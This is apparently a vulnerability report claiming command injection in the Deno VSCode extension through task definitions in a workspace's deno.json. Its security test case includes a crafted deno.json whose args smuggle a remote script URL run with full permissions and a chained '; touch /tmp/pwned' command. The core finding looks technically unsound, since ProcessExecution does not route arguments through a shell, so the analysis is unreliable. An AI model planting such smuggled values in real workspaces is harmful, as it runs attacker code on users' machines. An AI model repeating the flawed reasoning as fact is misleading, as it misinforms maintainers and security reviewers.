### Vulnerability List

- Vulnerability Name: Command Injection in Task Definitions
- Description:
    - A malicious user can modify the `deno.json` configuration file within a workspace.
    - This file can define custom tasks for the Deno extension.
    - The VSCode extension retrieves these task definitions from the Deno Language Server.
    - When a user executes a task defined in `deno.json` (e.g., from the "Deno Tasks" sidebar), the extension uses `vscode.tasks.executeTask` with `vscode.ProcessExecution`.
    - The `command` and `args` properties of the task definition, which are directly taken from the `deno.json` file, are used to construct the command executed by `vscode.ProcessExecution`.
    - By crafting a malicious `deno.json` file, an attacker can inject arbitrary shell commands into the `command` or `args` properties.
    - When a victim user executes this maliciously defined task, the injected commands will be executed with the privileges of the VSCode process, leading to command injection.
- Impact:
    - Remote Code Execution. An attacker can achieve arbitrary code execution on the user's machine by injecting malicious commands into task definitions within `deno.json` and tricking the user into executing these tasks.
- Vulnerability Rank: high
- Currently implemented mitigations:
    - None. The extension does not perform any sanitization or validation of the `command` and `args` properties from task definitions.
- Missing mitigations:
    - Input sanitization and validation for task commands and arguments are missing.
    - The extension should implement a mechanism to validate or sanitize the `command` and `args` properties extracted from task definitions in `deno.json` and similar configuration files.
    - Ideally, a whitelist of allowed commands and strict sanitization of arguments should be implemented to prevent command injection attacks.
- Preconditions:
    - The attacker needs to have the ability to modify the `deno.json` file or any other configuration file from which Deno tasks are derived within a workspace that a victim user opens in VSCode.
    - The Deno VSCode extension must be installed and enabled for the workspace.
    - The victim user must execute the malicious task, for example, by clicking "Run Task" in the "Deno Tasks" sidebar.
- Source code analysis:
    - File: `/code/client/src/tasks_sidebar.ts`
        - In `DenoTaskProvider.provideTasks()`, the extension requests task definitions from the Deno Language Server using `client.sendRequest(taskReq)`.
        - The retrieved task definitions are then used to create `vscode.Task` objects via `buildDenoConfigTask`.
    - File: `/code/client/src/tasks.ts`
        - `buildDenoConfigTask()` creates a `vscode.Task` using `vscode.ProcessExecution`.
        - The `command` and `args` for `vscode.ProcessExecution` are directly derived from the task definition, which originates from user-controlled `deno.json` without sanitization.
    - File: `/code/client/src/lsp_extensions.ts`
        - Defines the `task` request and `TaskRequestResponse` type, which includes `command` and `detail` (alias for command) properties that are used without validation.

- Security test case:
    - Step 1: Setup
        - Ensure VSCode with the Deno extension is installed and enabled.
        - Open a workspace folder in VSCode.
    - Step 2: Create Malicious `deno.json`
        - Create or modify `deno.json` in the workspace root with the following content:
        ```json
        {
          "tasks": {
            "maliciousTask": {
              "command": "run",
              "args": [
                "-A",
                "https://example.com/malicious_script.ts; touch /tmp/pwned"
              ]
            }
          }
        }
        ```
        *(Note: `https://example.com/malicious_script.ts` can be replaced with a harmless script or removed if the goal is just to test command injection via `; touch /tmp/pwned`)*
    - Step 3: Open Deno Tasks Sidebar
        - Open the "Deno Tasks" sidebar in VSCode (View -> Open View... -> Deno Tasks).
    - Step 4: Execute Malicious Task
        - In the "Deno Tasks" sidebar, find "maliciousTask" under your workspace and click the "Run Task" button.
    - Step 5: Verify Command Injection
        - After the task execution completes, check if the file `/tmp/pwned` exists.
        - Execute command in terminal: `ls /tmp/pwned`
        - If the file `/tmp/pwned` exists, the command injection was successful.
    - Expected Result:
        - The file `/tmp/pwned` should be created in the `/tmp` directory, indicating successful execution of the injected command, thus confirming the command injection vulnerability.
